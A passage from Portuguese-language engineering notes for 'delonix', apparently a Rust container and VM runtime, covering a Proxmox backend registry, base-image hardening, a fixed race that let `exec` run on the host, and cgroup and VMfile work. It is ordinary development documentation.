interessa a quem vier a seguir**: o `delonix-net` é uma BIBLIOTECA, e o
`delonix-paas` (privado) consome-a por tag de git em vários crates — usando
precisamente o que foi apagado (`Net.apply_container_firewall`,
`Net.firewall_summary`). Nada parte hoje, porque o pin é uma tag. O que muda é
que **subir esse pin passa a exigir uma travessia do lado do PaaS**, e há um
método sem substituto vivo: o `firewall_summary` (o `infra` tem
`apply_firewall`/`clear_firewall`/`status`, mas nada que devolva o sumário
DNAT/blocked/isolation/masquerade). Se ele for preciso outra vez, o sítio é o
`infra`, contra a tabela `dlxing` — a `ip delonix` que o antigo lia já não
existe.

Saíram na mesma passagem os órfãos públicos que a remoção criou
(`FirewallSummary`, `DnatRule`, `cidr_prefix_len`, `service_vip`) — o compilador
não os assinala, porque `dead_code` só vê itens privados. **Ao apagar uma API
pública, a cascata privada é do compilador; a pública tem de ser contada à mão.**

## O registo de backends de VM, e o backend Proxmox (ADR-0008, fechado 2026-08-11)

`backend_for` era um `match` privado sobre dois literais. A tabela estática que o
substituiu resolveu o `_ => CloudHypervisorBackend` (mentia sobre o que estava a correr) mas
deixou metade da decisão 2 por fazer: **um crate que depende do `delonix-vm` — como qualquer
backend tem de depender, pelo trait — não se consegue pôr dentro de um `static` que vive lá.**
Por isso o `delonix-proxmox` esteve no workspace, implementado e provado contra um nó real, **sem
um único chamador**.

- **Uma registration leva um CLOSURE** (`BackendFactory = Box<dyn Fn() -> Result<Box<dyn
  VmBackend>> + Send + Sync>`), e é essa a forma toda: um backend remoto precisa de endpoint,
  nome de nó e credencial, e um `fn() -> Box<dyn VmBackend>` não tem onde os receber. O
  `Send + Sync` prende o CLOSURE, **não o trait** — nenhuma implementação mudou.
- **Registar não faz I/O.** A factory não é chamada, logo um nó inalcançável custa zero até
  alguém escolher o backend pelo nome.
- **`auto_selectable` é campo da REGISTRATION e não só método do backend construído.** A
  auto-detecção tem de responder a isso *sem construir*, porque construir é onde um backend
  remoto se autentica. O `select_backend` antigo fazia `.map(build).filter(auto_selectable)` —
  construía todos e deitava fora os errados, que é exactamente a ida à rede que a flag existe
  para evitar. Grátis nos dois backends locais, que é a razão de ninguém ter reparado.
- **Nomes têm dono**: um id/alias que já é de OUTRO backend é recusado (o perdedor ficava
  inalcançável por nome, em silêncio); re-registar o MESMO id substitui, para reconfigurar um
  alvo não deixar duas entradas a sombrear-se.
- **O primeiro chamador é o `-bin`** (`cmd/vmbackends.rs`, chamado uma vez do `run()`):
  `DELONIX_PROXMOX_URL`/`_NODE` + credencial (`kind: Secret` via `DELONIX_PROXMOX_SECRET`
  primeiro). Env e não campo de manifesto porque o `create_with` resolve o backend sozinho e
  **nunca recebe um alvo** — a registration tem de estar feita antes de o motor ser chamado. Um
  alvo mal configurado **avisa e segue**: um typo no token não pode parar um `container ls`.
- **`ProxmoxBackend` segura um `Arc<Client>`** e a factory clona-o. Sem isso, cada
  `backend_for` — uma vez por VM no `vm ls` — era autenticar + `GET /nodes` outra vez: listar
  dez VMs eram trinta round-trips onde doze chegam.
- **Validado ao vivo pela CLI** contra o appliance `proxmox-ve:9.1` deste repo: `vm create
  --backend proxmox --disk local-lvm:1` → `vm ls` Running → `vm rm` → nó vazio.

**Três defeitos que a mesma passagem encontrou**, e o primeiro só existia porque ninguém podia
alcançar o ramo: (1) o `create_with` **apagava o `cfg.disk`** num boot falhado — com
`manages_own_storage` o `overlay` É o `cfg.disk` verbatim, e o motor removia um ficheiro que não
criou (hoje `local-lvm:8`, logo o unlink falha, mas a regra não pode assentar na grafia que um
backend calha usar); (2) o `mem_mib` estava **reimplementado** no `delonix-proxmox` e a cópia não
conhecia o sufixo k8s — `memory: 2Gi` dava 2 GiB em libvirt/CH e **1 GiB** em Proxmox, em
silêncio (agora o do motor é `pub` e partilhado, disciplina do `fw_rule_tail`); (3) o
`urlencode` codificava code points e não bytes (`ç` → `%E7` em vez de `%C3%A7`, e acima de 0xFF
saía `%1F600`, que não é percent-encoding nenhum — e um UPID traz o nome da conta lá dentro).

**Guest agent (`ip()`)**: são duas metades e só uma é nossa. O **canal** é o `agent=1` que o
`create_vm` manda (sem ele o nó nem tenta — toda a chamada `/agent/…` responde «not running»,
haja o que houver no convidado); o **agente** é do lado da imagem. O `parse_agent_ip` toma o
primeiro IPv4 que não seja loopback, IPv6 nem **`169.254.0.0/16`** — este último é o que uma
interface tem quando o DHCP FALHOU, e reportá-lo diria «a VM tem endereço» quando a verdade é o
contrário. O `lo` é saltado pelo nome **e** o 127/8 pelo valor, porque é a primeira entrada que o
agente devolve: «o primeiro IPv4» seria loopback em todos os convidados. **`None` é resposta de
primeira classe**, não falha — um convidado sem agente faz o nó responder HTTP 500 «QEMU guest
agent is not running» (medido), o `vm ls` chama isto por VM em cada listagem, logo custa um `None`
e uma linha de `debug` (nunca um aviso; mas `debug` e não nada, porque «sem agente» e «o token
perdeu permissões» dão os dois uma coluna IP vazia). O `clone_template` **não** força o `agent=1`:
um clone herda a config do template, e sobrepor contradiria uma escolha de quem o fez.
**Não validado ao vivo**: um endereço a vir mesmo de um agente — precisava de um convidado
aninhado com o `qemu-guest-agent` instalado, e o custo passou o valor da prova. Validado ao vivo
está o canal numa VM criada pelo backend, e o `ip()` a devolver `None` em silêncio.

**`stop` e `destroy` são a MESMA operação num backend local e NÃO num remoto** — e confundi-los
apagava dados. Localmente o disco é do motor (o `undefine` do libvirt não toca no
`<root>/vms/<name>.qcow2`); num nó remoto a única chamada que liberta a VM liberta o disco com
ela. O backend Proxmox lia `stop` como «parar e destruir» por uma razão certa (uma VM deixada
para trás depois de um `vm rm` é um órfão) ligada ao verbo errado: o motor chama `stop` também
para o `vm stop`, e o bloco de próximos-passos da própria CLI promete `stop it (keeps the disk)`.
O `VmBackend::destroy` é novo, **por omissão é o `stop`** (os dois locais ficam byte-a-byte
iguais) e o `remove_inner` passou a chamá-lo.

**`vm start` de uma VM remota parada criava uma SEGUNDA.** O `boot` pede ao nó o próximo id livre,
logo o registo passava a apontar para uma VM nova de disco vazio e a original ficava órfã — os
dados lá, e nada a apontar-lhes. O `VmBackend::resume` é novo, por omissão `Ok(None)` (o `boot`
dos locais já é idempotente pelo overlay), e o do Proxmox arranca o vmid que o registo nomeia.

**Campos recusados PELO NOME** (`refuse_unsupported`, antes de criar seja o que for), agrupados
pelo porquê: o convidado está noutra máquina (`kernel`/`initrd`/`firmware`/`cmdline`/`seed`/
`devices`/`volumes`), o Proxmox é dono dos botões do QEMU (`hugepages`/`cpuAffinity`/`machine`/
`cpuModel`/`cpuTopology`/`tpm`/`video`/`bootOrder`), ou não há XML de domínio nenhum
(`libvirtXml*`). Vários são reportados JUNTOS — corrigi-los um erro de cada vez é uma tentativa de
create por campo. **Apanhou logo um caso real**: a CLI gerava um seed NoCloud SEMPRE, que é um
ficheiro deste host e ilegível num nó remoto, por isso um `vm create --backend proxmox` simples
falhava por um seed que ninguém pediu. A CLI passa a saltá-lo para um backend com storage própria
(`backend_manages_own_storage`) e a recusar `--hostname`/`--ssh-key`/`--user-data` aí — o mesmo
formato da recusa de imagem-appliance que já estava mesmo por cima.

**Snapshots** implementados com `vmstate=1` (checkpoint de sistema, como o libvirt), e o
pseudo-registo `current` da API filtrado da listagem **e** recusado como nome — senão
`vm restore <vm> current` parecia coisa suportada. **Rede**: bridge (`VmConfig.bridge` → alvo →
`vmbr0`) e VLAN do alvo (descreve como o NÓ está cablado, não a VM); uma etiqueta fora de gama é
**erro**, nunca um `None` — descartá-la punha a VM na rede sem tag com o operador a julgá-la
isolada. **O ticket expira** (2 h) e o cliente é partilhado pelo processo todo, por isso o
`send_authed` reautentica uma vez num 401 — só com password: um API token que leva 401 foi
revogado, e repetir para sempre é como uma credencial fica bloqueada.

**Correcção**: a nota que dizia o `net0=virtio,bridge=vmbr0` recusado pela API estava errada — era
artefacto do `curl -d` do spike, que não faz URL-encoding. O `.form()` do reqwest faz, e o nó
aceita (medido: `net0 = virtio=BC:24:11:F4:F9:9C,bridge=vmbr0` na config). O backend sempre mandou
bem; só o documento estava mal.

**A nota de método vale mais que os três.** O primeiro teste da ordenação da auto-detecção
registava o candidato remoto no registo GLOBAL e chamava `select_backend(None)` — e **passava com
o bug lá dentro**: este host tem um backend local instalado, a passagem pára na primeira entrada,
e o remoto nunca é alcançado. Um teste que não consegue chegar à linha de que trata não prova
nada. A correcção foi extrair `auto_detect(&[BackendRegistration])` e dar-lhe uma tabela onde o
candidato saltado é mesmo alcançado. Os três defeitos foram depois verificados pela regra do
repo: revertidos um a um, cada teste falha.

## A imagem base não leva credenciais, e diz o que tem dentro (2026-08-18)

Revisão da `delonix-vm-base` contra o que uma cloud exige de uma imagem base. Sete lacunas;
cinco são código e estão fechadas, duas são decisões (ADR de assinatura e de multi-arch).

- **Nenhuma conta leva password.** Root e `delonix` tinham `delonix`, escrita neste repositório
  PÚBLICO — uma credencial que vive num repo aberto não é uma credencial, e a conta tem sudo sem
  password, por isso quem chegasse a um prompt de login era root. A mitigação anterior (desligar
  o login por password no SSH e manter a consola série aberta «para quando a VM perde a rede»)
  vale para uma VM de laboratório e deixa de valer no instante em que o MESMO artefacto é
  publicado: num hipervisor partilhado a consola não é uma porta menor que o SSH. As duas contas
  ficam trancadas (`passwd -l`) e as vias de entrada suportadas continuam intactas — a chave SSH
  que o cloud-init injecta e a que o `cluster kubeadm` gera. `--root-password` existe para quem
  precise mesmo da consola série a aceitar um login: escolha explícita de quem constrói, e vive
  só naquela imagem.
- **`qemu-guest-agent` nas três receitas.** Estava só na receita offline da golden, por isso a
  `delonix-vm-base` saía sem agente: sem ele o hipervisor não descobre o IP, não congela o
  filesystem para um snapshot consistente, e um shutdown ordenado passa a ser um corte de
  energia. O `enable` é feito por nós e não confiado ao postinst do pacote — este corre
  `deb-systemd-helper` contra um convidado onde o systemd não está a correr, o que é uma
  afirmação sobre o script de outra pessoa e não uma medição.
- **O journal era volátil**, logo um reboot apagava os logs do arranque que falhou. Passa a
  persistente nas quatro distros, **com tecto** (200 MiB) — este host já teve disk-pressure, e um
  journal sem limite na raiz de 10 GiB de um inquilino é enchê-la com os nossos próprios logs.
- **Agente de métricas OPT-IN** (`--node-exporter[=<addr>]`). Sem a flag a imagem não abre porta
  nenhuma: um listener em todas as cópias publicadas é uma porta que o inquilino nunca pediu. A
  AWS e a GCP põem o guest agent por omissão e deixam o de métricas por activar. A versão está
  PINADA — um `latest` flutuante faria duas builds da mesma receita darem imagens diferentes.
- **Inventário e proveniência.** `/usr/share/delonix/packages.tsv` dentro da imagem e num sidecar
  ao lado do qcow2 (nome, versão, arch — o conteúdo que um SPDX carrega, na forma que o convidado
  produz sem ferramenta nova), mais `/etc/delonix-image-release` com base + sha256 da base, que
  `delonix` construiu, k8s, offline e extra-packages. Sem isto, «esta versão está aqui?» obriga a
  montar a imagem. **Não é uma promessa de build reprodutível** — o apt/dnf resolvem contra um
  arquivo em movimento; pinar cada versão transitiva exigiria um mirror de snapshot, que é
  decisão de plataforma e não uma flag deste comando.
- **O disco já estava fechado** por `GOLDEN_DISK_SIZE_GIB = 10` (2026-08-17): a medição que
  levantou a lacuna era de uma imagem construída a 2026-08-12, antes dessa correcção. Vale como
  método — medir o artefacto que está publicado, não o que está no store.

**Armadilha de teste que se pagou duas vezes na mesma passagem**: dois testes fixavam POSIÇÕES na
cauda da receita (`ops[len-2]` é a limpeza do apt) e chumbaram por a cauda ter crescido (journal,
inventário). O que eles querem dizer é ORDEM — a limpeza depois de tudo o que instala, o reset do
machine-id em último — e é assim que estão escritos agora.

**Validado ao vivo** contra um convidado Ubuntu 24.04 real (`virt-customize --no-network` sobre
uma cópia da imagem publicada), e contra o RESULTADO e não contra o rc: 669 pacotes com TABs
reais e ordenados, o drop-in do journal com newlines a sério, e `root`/`delonix` com `!` à frente
do hash no `/etc/shadow`. **Não validado**: um build completo de ponta a ponta com `--network`
(precisa dos contornos de host do passt já documentados), e o `--node-exporter` contra um
Prometheus a fazer scrape a sério.

## Um `exec` logo a seguir ao `run -d` corria no HOST (2026-08-28)

Reportado como «o `exec` escreve para o `/data` do ROOTFS em vez de para o volume». **A medição
diz outra coisa, e pior**: o `exec` que apanha a janela corre no **filesystem do HOST**. Não é o
destino errado dentro do container — é fora dele.

A prova, com dois caminhos que não podem coexistir (`/etc/alpine-release` só existe no container,
`/tmp/dlx-race/` só existe no host): 3 de 12 corridas responderam `NAO-CONTAINER` e **duas
criaram ficheiros reais em `/tmp` do host**, com **exit 0**. Ou seja o `exec` executou o
`/bin/sh` do host — a mensagem de erro delatou-o antes da sonda: `sh: 1: cannot create
/data/f.txt: Directory nonexistent` é o `dash` do Ubuntu, não o busybox do alpine, e o `cat`
seguinte já respondia com a redacção do busybox.

**A causa**: no caminho `detach` o `spawn` devolvia logo a seguir a libertar o init (o byte «GO»
do handshake de userns), e é só DEPOIS disso que o init faz `setup_rootfs` — os binds dos
volumes, o `pivot_root`, o `/dev`, os tmpfs, os secret files. O `exec` faz `setns` para o
`mnt` do container, que existe desde o `clone`: entrar antes do `pivot_root` é entrar num mount
namespace cuja raiz ainda é a do host.

**Porque passou dias por flakiness**: é silencioso sempre que o caminho existe dos dois lados. Um
backup tirado nessa janela arquiva um volume vazio, e a falha aparece dois passos à frente, no
check «os dados voltaram», a apontar para o restore — que estava bom.

**A saída escolhida foi fechar a janela na origem** (o `run -d` só devolve com os mounts de pé),
e não pôr o `exec` a recusar enquanto não estivessem. Três razões, por ordem de peso: o `exec`
não é o único a entrar por `setns`/`/proc/<pid>/root`, logo a recusa teria de ser repetida em
cada consumidor; recusar devolve o custo a quem chama, que é exactamente o penso de
escrever-e-reler que a bateria já tinha posto e que este trabalho existe para tirar; e o
mecanismo já tem precedente com razão escrita no mesmo ficheiro — o `reexec_mapped_hold` já
espera pela prova de que o mount está de pé, pela mesma «resposta-vazia-em-silêncio».

- **Um pipe `O_CLOEXEC`**, escrito pelo init logo a seguir ao último mount
  (`apply_readonly_paths`) e lido pelo `spawn` como ÚLTIMA coisa antes de devolver. O CLOEXEC é
  que carrega o caso mau: se o init morre, ou chega ao `execvp` sem escrever, o fd fecha e o pai
  lê EOF em vez de esperar para sempre.
- **Deliberadamente antes do `chown_tree_once`** (que percorre o rootfs inteiro para uma imagem
  com `USER` ≠ root) e antes das caps/seccomp/apparmor: nada disso muda o que um intruso vê, e
  fazer o `run -d` esperar por um chown de árvore completa trocava um defeito real por uma
  lentidão visível.
- **Zero reordenação do que já existia** — o handshake de userns, o `recv_fd` da consola e o log
  shim têm uma ordem que os comentários chamam CRITICAL, e esta espera não precisa de nenhuma
  delas: só precisa de ser a última.
- **Tecto de 60s com aviso alto**, nunca uma espera sem fim: um mount que pendura (um bind sobre
  um NFS que não responde) não pode pendurar o `run`, porque antes disto não pendurava. E o
  aviso é dito, porque é exactamente aí que o `exec` seguinte pode aterrar no host.
- **O que NÃO mudou, de propósito**: um `run -d` cujo init morre a montar continua a reportar o
  que reportava. Mudar o relato de erro é uma segunda decisão, com as suas próprias medições, e
  misturá-la com a correcção de uma corrida é como se mete uma mudança por rever.

**Medido, mesma sonda, mesma máquina**: antes 5 em 54 corridas fora do container; depois 0 em 54,
e 0 em 36 mais com carga. Latência do `run -d`: mediana 102 → 95 ms — indistinguível do ruído,
porque os mounts já corriam em paralelo com o trabalho que o pai fazia a seguir ao GO.

**A segunda metade: o REGISTO também mentia, e essa não passa pelo `run -d`.** Registei-a
primeiro como resíduo aceitável e a medição desmentiu-me — o `store.save(Running)` acontecia
antes da prova, e é o `pid` + `Running` no store que um TERCEIRO lê para decidir que o container
está lá para ser entrado (o CRI, o `serve docker-api`, uma CLI concorrente), nenhum deles a
passar pelo `run` que espera. Medido **no binário já corrigido**: em 2 de 15 corridas, no instante
em que o registo ganhou `pid`, o `/proc/<pid>/root` era ainda o do host. O save passou para
depois da prova; 55/55 depois disso.

- **Como se mediu, e é a parte reutilizável**: não por sorte de timing, mas como PROPRIEDADE — um
  espião que faz polling do JSON e, mal veja o `pid`, compara `/proc/<pid>/root` com `/` (dois
  `stat`, sem arrancar processo nenhum). Um `exec` leva ~50 ms a arrancar e por isso quase nunca
  chega à janela: foi assim que este resíduo escapou à primeira passagem, com um espião que
  invocava a CLI e dava 0/15 sobre um defeito que lá estava.
- **O `setup_cgroup` NÃO foi movido com ele**: é de onde pendem os limites do container, e cada
  milissegundo fora de um cgroup é um milissegundo a correr sem tecto. Montar não aloca nada,
  logo esperar primeiro não compraria segurança nenhuma e custava isso.
- **Efeito de lado, na direcção certa**: um hook de rede que falha deixa agora o registo
  intocado, em vez de dizer `Running` para um processo que ele próprio acabou de SIGKILL.

**Os gates são DOIS, e nenhum substitui o outro.** O
`the_mount_wait_has_three_exits_and_none_is_unbounded` prova, de forma determinística, que
a espera existe e que as três saídas (byte, EOF, tecto) são todas finitas — verificado pela regra
do repo: com a função a devolver de imediato, chumba em «devia ter esperado ~120ms e desistido,
esperou 721ns». O check da bateria prova a LIGAÇÃO, que o unitário não alcança.

**E o gate da bateria admite o que é: amostragem.** O que decide a corrida é o filho ser
escalonado antes de o `exec` — um processo NOVO — chegar ao `setns`, logo a taxa segue a
contenção de CPU e **não** o número de mounts: medido no binário defeituoso, 0/20 com a máquina
folgada, 0/20 com 40 volumes, 4–7/20 com `nproc` workers a queimar CPU. Por isso o check gera
carga e corre 12 ciclos — 93% a 99,8% de detecção, contra praticamente 0% sem ela, e verificado
3/3 a chumbar o binário anterior (sempre no 1.º ou 2.º ciclo) e 3/3 a passar o corrigido. Um
check que apanhasse isto uma vez em cada três corridas seria pior que nenhum: leria como verde.

**O terceiro check é o do registo, e é DETERMINÍSTICO** — mede a propriedade em vez de amostrar a
corrida, com o mesmo espião de dois `stat` acima. Verificado no caso que separa os dois: contra um
binário COM a espera mas com o save no sítio antigo, chumba 3/3 (sempre no ciclo 1) enquanto o
check da janela continua verde. É isso que prova que cobrem metades diferentes, e não a mesma
coisa duas vezes.


## Regra de ouro: fronteira com o PaaS

Este código **não pode depender de nada privado**. Antes de qualquer commit:

1. **Nunca** adicionar uma dependência a `delonix-core`, `delonix-api`, `delonix-orchestrator`,
   ou qualquer outro crate do monorepo `delonix-paas` — este repo tem de compilar sozinho,
   sem acesso a nada privado. `cargo tree -e normal` não deve mostrar nenhum crate `delonix-*`
   que não esteja listado no `Cargo.toml` raiz.
2. **Sem noção de tenant/licença/billing/Console.** Se uma mudança precisar de saber "quem é
   o cliente" ou "que plano tem", essa lógica pertence ao `delonix-paas`, não aqui.
3. **`Secret`/`SecretStore`/`CredVault`** (`delonix-runtime-core::secret`/`cred_vault`) são o
   Secret Manager do runtime (`--secret`/`--secret-files`, Docker-style) — não confundir com
   nenhum cofre de credenciais de plataforma/SSO/DNS que o PaaS privado tenha por cima.
4. **`delonix-net` inclui WireGuard** (`wg.rs`) — cifra o transporte VXLAN entre nós, é SDN
   genuína (fica aqui). O broker de control-plane que decide QUANDO publicar portas
   (`Router`, multi-tenant) ficou no lado privado (`delonix-overlay`, em `delonix-paas`).

## Arquitetura (14 crates)

| Crate | Responsabilidade |
|---|---|
| `delonix-runtime-core` | tipos partilhados: `Container`, `Vm`, `Status` (6 estados), `Store`/`JsonStore`, typestate, deteção de virtualização, Secret Manager |
| `delonix-runtime` / `delonix-runtime-bin` | runtime de containers (clone/namespaces/cgroups, create/stop/exec, reconcile_status) + a CLI `delonix` completa (container/image/build/vm/volumes/network — ver secção "CLI" acima) |
| `delonix-net` | SDN rootless: holder netns + bridge + slirp único, DNAT/firewall nft, compat CNI, overlay WireGuard inter-nó |
| `delonix-net-rules` | regras de rede PURAS, **zero dependências** — `Cidr`, nome de bridge, IPAM dentro de um prefixo, leitura de taxas. Existe para o control-plane do `delonix-paas` calcular o MESMO que o motor sem um salto de rede pelo meio; o `delonix-net` re-exporta tudo, por isso nenhum consumidor teve de mudar |
| `delonix-image` | imagens OCI: pull/registry/build, buildpacks CNB, registo interno, verificação de assinatura |
| `delonix-vm` | microVMs declarativas — trait `VmBackend` + o **registo** de backends (Cloud Hypervisor e libvirt vêm semeados; um terceiro entra por `register_backend`) |
| `delonix-proxmox` | backend `VmBackend` remoto contra a API de UM nó Proxmox VE (ADR-0008). Fora do `delonix-vm` porque um cliente HTTP não entra num crate de motor; registado pelo `-bin`, que é quem conhece o alvo |
| `delonix-truenas` | provisionar dataset/quota/partilha numa NAS pela API (ADR-0009) — mesma razão de crate à parte |
| `delonix-volume` | volumes nomeados e bind mounts |
| `delonix-cri` | servidor CRI (`runtime.v1`) — permite ao Delonix servir de runtime a um `kubelet` |
| `delonix-mgmt` | API de gestão LOCAL (HTTP+JSON num socket unix, só o próprio uid) para um control-plane externo, mais o registo Prometheus partilhado e os spans OpenTelemetry. Não é remota, e o `cli-stability.md` diz que não se deve construir automação sobre ela — ver ADR-0010 |
| `delonix-scan` | SBOM + varredura de CVE (`image scan`, e a imposição de scan-on-pull) |
| `delonix-mcp` | servidor Model Context Protocol (ADR-0025) — superfície de controlo de IA LOCAL e sem inquilino, `stdio`-only nesta fase; as tools chamam a `Store`/os crates de domínio, nunca constroem shell arbitrário |
| `delonix-security-runtime` | as decisões de segurança do nó: a política (`policy.json`), o **único** ponto de admissão — container **e** VM —, o `SecurityEvent`, o score explicável e a redacção de segredos. Puro: três dependências, sem sensores, sem daemon e **sem noção de inquilino** (guarda-rio #2, imposto por teste) — ver ADR-0026 |

## Histórico

Extraído de `delonix-paas` via `git filter-repo` (histórico real preservado, não squash) —
ver a skill `delonix-paas` no control dir para o produto de origem.


## VMfile, `vm build` e o `--network` (v0.44.0/v0.45.0)

`delonix vm init --vmfile` gera o esqueleto, `vm build` constrói o qcow2, `vm create --url-img`
arranca de um qcow2 publicado. `FROM` é uma **cloud image** (ubuntu/debian/rocky ou um URL
absoluto), não uma imagem OCI — é o cloud-init que faz o primeiro boot aplicar hostname, chaves
e contas. Multi-stage com `COPY --from=` (cada estágio é um DISCO inteiro, não uma layer).

- **`--no-network` é a omissão e `--network` é opt-in**, nos três caminhos (`vm build`,
  `image vm build`, `image --vm build`); na receita dourada é recusado, porque lá quem decide é
  o `--offline`. A v0.44.0 saiu com um esqueleto que dizia «*Builds as written*» e cujo primeiro
  `RUN` era `apt-get install` — impossível offline. Offline continua certo por omissão (um build
  que vai à internet dá uma imagem diferente conforme o dia), mas a coisa mais comum que se quer
  fazer numa imagem é instalar um pacote, e um motor que a torna impossível não oferece uma
  escolha: recusa.
- **A chave injectada vai para a conta `delonix`**, não para a default da distro. Numa cloud
  image de Ubuntu o palpite é `ubuntu`, essa conta EXISTE e não tem a chave — responde
  `Permission denied (publickey)`, que se lê como chave partida e não como nome errado. Por isso
  o bloco de próximos passos do `vm create` imprime o `ssh` exacto (só no caminho em que o seed é
  gerado por nós; com `--seed` próprio estaríamos a adivinhar).
- **Validado ao vivo**: `vm create --url-img` de ponta a ponta (download, overlay, seed NoCloud,
  boot em libvirt, cloud-init aplicado, SSH lá dentro). O `vm build` está provado até à fronteira
  do `virt-customize` (download + `SHA256SUMS` + achatamento + `SIZE` antes de qualquer `RUN`);
  o `virt-customize` em si **continua por exercitar** — a máquina de desenvolvimento não tem
  `libguestfs-tools` e o `install.sh` não o instala.

## Delegação de cgroup: `cpu` fatal, `cpuset`/`io` opcionais (v0.44.0)

Correcção a uma recomendação errada que esteve publicada: **`sudo delonix system setup
--delegate` não era a correcção** para este host. Medido no Ubuntu 24.04 de fábrica:

- o `user@.service` já traz `Delegate=pids memory cpu`, e o `subtree_control` do
  `user@<uid>.service` já é do utilizador — a delegação não estava em falta, estava feita;
- o que faltava o `cpu` era o **slice de ONDE o comando corre** (`app.slice`, o scope do editor),
  e nenhum drop-in no `/etc` lhe toca;
- **`cpuset`/`io` nunca podem aparecer**: o `user.slice`, que é da root, só passa
  `cpu memory pids` para baixo. Pedi-los é pedir o que o antepassado não tem para dar.

Daí: `missing` (só `cpu` — um nó Kubernetes não arranca sem ele) e `absent` (`cpuset`/`io`, o
estado normal) são factos DIFERENTES; o remédio 1 é `systemd-run --user --scope -p Delegate=yes`
(sem root, sem reiniciar sessão) e o drop-in no `/etc` é o 2, só para quando o 1 ainda acusar o
`cpu`. O `install.sh` **salta** o drop-in num host que já delega `cpu`. Teste que fixa a
distinção: `so_o_cpu_e_fatal_para_um_no_kubernetes`.

**Armadilha do próprio cgroup desta shell**: numa sessão pode MUDAR entre invocações (o scope do
editor ganhou `cpu` a meio de uma sessão de 2026-08-09), e o mesmo comando recusou e depois
avançou. `system setup` e o preflight do `cluster create` lêem a mesma coisa; o que varia é o
host.

## O cgroup de um container desaparece com ele (medido 2026-08-09)

Relevante para quem for fazer o `OOMKilled` do CRI, que é uma das lacunas reais: **não há
detecção post-mortem possível**. Medido com um `tail /dev/zero` sob `-m 48M`:

- em vida, o cgroup está em `…/user@<uid>.service/dlx-containers/dlx-<id>` (a base de escape,
  logo SOBREVIVE ao scope efémero de onde o comando foi lançado);
- o container morre em ~1s e, sem nenhum comando nosso a correr entre a morte e a leitura, o
  directório **já não existe** — `memory.events`/`oom_kill` não são legíveis a seguir;
- o registo fica `status: Crashed` com `crash_reason: null`, e o CRI reporta
  `reason: "Error"` (o `container_status` só sabe `Completed`/`Error`).

Portanto o `oom_kill` tem de ser capturado **ao vivo** por quem já vive tanto quanto o container
— o candidato natural é o shim de logs, que é o único processo por-container que existe neste
modelo — e persistido no registo. Não tentar lê-lo depois: a informação já não está lá.

## `HYPERVISOR` no VMfile + `vm convert` + `vm default-backend` (v0.45.x)

Três lacunas fechadas na pilha de imagens VM já existente (`vm build`/`vm create`), pedidas
juntas: "converter para hypervisor", "VMfile compatível com os principais hypervisors" e "definir
o default hypervisor (libvirt ou cloud hypervisor)" — os dois backends que o `delonix-vm` já
suporta, não o Microsoft Hyper-V (o motor corre em Linux/KVM/rootless; "hyperv" aqui é abreviatura
informal de "hypervisor").

- **`delonix image vm convert <origem> --to qcow2|raw [-o <destino>]`** (`vmimage::cmd_convert`,
  nos 3 pontos de entrada de sempre — `vm convert`/`image vm convert`/`image --vm convert`, +
  recusa clara em `image convert` sem `--vm`). `qemu-img convert` puro, mesmo padrão já usado em
  `cmd_build`; `origem` tenta primeiro um nome local do `VmImageStore`, cai para caminho literal
  se não bater. Não existe "formato Hyper-V" a converter — libvirt (QEMU) e Cloud Hypervisor já
  partilham qcow2/raw, por isso a conversão é só entre esses dois.
- **`HYPERVISOR <cloud-hypervisor|libvirt>` no VMfile** (`cmd::vmfile`, mesmo espírito de
  `VCPUS`/`MEMORY`) — canonicalizado no parse via `delonix_vm::valid_backend_name` (fail-closed a
  um nome desconhecido). **Corrigiu de caminho um gap pré-existente**: `vf.vcpus`/`vf.memory` já
  eram parseados e testados desde sempre, mas `vmfile::build()` nunca os escrevia no `VmImage`
  final — a doc-comment do `VmFile` prometia "defaults recorded in the image's metadata" e isso
  nunca tinha acontecido, o mesmo padrão de código morto (parseado, nunca ligado) que este repo já
  encontrou várias vezes noutros sítios. `VmImage` ganhou `default_vcpus`/`default_memory`/
  `default_backend` (`#[serde(default)]`, `None` em imagens antigas/`vm pull`ed — mesmo gap
  conhecido de `ubuntu_release`/`k8s_version`).
- **`vm create` aplica os defaults da imagem** quando `--disk` nomeia uma imagem local conhecida
  (ou nenhum `--disk` é dado, que resolve sempre a uma) — `--vcpus`/`--memory` passaram a
  `Option<u32>`/`Option<String>` (eram `default_value_t`/`default_value` do clap, que não permitem
  distinguir "omitido" de "valor igual ao default") para a precedência: `--vcpus`/`--memory`/
  `--backend` explícito > o que a imagem recomenda > `1`/`"1G"`/`None`. Lógica extraída para
  `resolve_vm_defaults` (pura, testada) — nenhuma chamada a `VmImageStore` dentro dela.
- **`DELONIX_VM_BACKEND` + `delonix vm default-backend [--set <backend>|--clear]`** — o motor só
  tinha auto-detecção (prefere Cloud Hypervisor se instalado, senão libvirt) sem forma de fixar
  uma preferência persistente. Vive em `delonix-vm` (`get/set/clear_default_backend`,
  `<DELONIX_ROOT>/vm-default-backend`, um nome canónico por linha — sem JSON novo, dependência
  zero), não só no bin, para `stack apply`/`cluster kubeadm` herdarem a preferência de borla, tal
  como o resto do módulo já documenta para a regra volumes⇒libvirt. **Precedência completa em
  `create_with`**: `cfg.backend` explícito (que já inclui o `HYPERVISOR` da imagem, resolvido no
  bin) > `DELONIX_VM_BACKEND` > o default persistido > a heurística de capacidade já existente
  (volumes⇒libvirt; cloud image sem kernel⇒libvirt se disponível). Os dois níveis novos comportam-se
  como um `--backend` explícito — incluindo ultrapassar a heurística e falhar tarde e alto no
  `boot` se pedirem um backend incompatível (ex.: CH + volumes) — porque são escolha explícita do
  operador, só feita uma vez em vez de por comando.
- **Validado ao vivo** (`DELONIX_ROOT` isolado no scratchpad, sem tocar em VMs/imagens reais deste
  host): `vm default-backend --set ch` normaliza para `cloud-hypervisor`, `--clear` volta a "none
  (auto-detecção)", nome desconhecido recusa sem escrever nada; `qemu-img create` de 4 MiB
  convertido nos 3 caminhos (`vm convert`/`image vm convert`/`image --vm convert`), `image convert`
  sem `--vm` recusa com a mensagem certa; `VMfile` com `FROM <imagem local>` + `HYPERVISOR
  libvirt` construído com `vm build` produz um `.json` com `"default_backend": "libvirt"`; as
  strings novas traduzem correctamente sob `--l18n=pt` (`pt.po`, secção "vm convert /
  default-backend / HYPERVISOR do VMfile"). **Não validado ao vivo** (deliberado, para não deixar
  uma VM real presa neste host partilhado nem exigir rede/`virt-customize`): o caminho completo
  `vm create --disk <imagem-com-HYPERVISOR>` a arrancar de facto no backend recomendado — coberto
  só por `resolve_vm_defaults`, que é pura e testada.
- **Por fazer, deliberadamente fora deste incremento**: um ISO de instalação/live-boot a partir de
  um build (a leitura "converter para hypervisor" nunca foi sobre isto — ver a nota de decisão que
